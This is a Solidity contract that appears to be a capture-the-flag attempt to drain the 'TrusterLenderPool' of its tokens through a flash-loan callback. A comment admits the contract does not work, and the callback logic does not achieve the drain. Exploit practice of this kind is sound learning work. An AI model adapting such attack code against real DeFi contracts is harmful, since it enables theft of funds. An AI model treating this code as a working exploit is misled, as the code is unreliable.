pragma solidity ^0.6.0;

import "./TrusterLenderPool.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

// This contract didn't work......
contract AttackTrusterLender {

    using SafeMath for uint256;

    TrusterLenderPool private pool;
    IERC20 private token;
    address payable private owner;

    modifier onlyPool() {
        require(msg.sender == address(pool));
        _;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    constructor(address poolAddress, address tokenAddress) public {
        pool = TrusterLenderPool(poolAddress);
        token = IERC20(tokenAddress);
        owner = msg.sender;
    }

    // function gg(function() external callback) external onlyPool {
    function gg() external onlyPool {
        uint256 totalBalance = token.balanceOf(address(this));
        require(token.transfer(msg.sender, totalBalance));
    }

    function attack() external onlyOwner {
        // require(IERC20(tokenAddress).transferFrom(msg.sender, address(this), amount));
        uint256 totalBalance = token.balanceOf(address(pool));
        pool.flashLoan(
            totalBalance,
            address(this),
            address(this),
            abi.encodeWithSignature("gg()")
        );
    }
}